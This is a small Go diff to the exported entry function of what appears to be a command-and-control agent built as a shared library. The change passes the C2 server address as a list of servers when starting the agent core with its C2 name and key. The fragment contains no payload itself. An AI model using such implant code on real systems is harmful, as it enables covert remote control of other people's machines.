@@ -17,7 +17,9 @@ var (
 //export VoidFunc
 func VoidFunc() {
 	c2Config := map[string]string{"c2Name": c2Name, "c2Key": c2Key}
-	core.Core(server, 0, nil, c2Config, false, 0)
+	var servers []string
+	servers = append(servers, server)
+	core.Core(servers, 0, nil, c2Config, false)
 }
 
 func main() {}
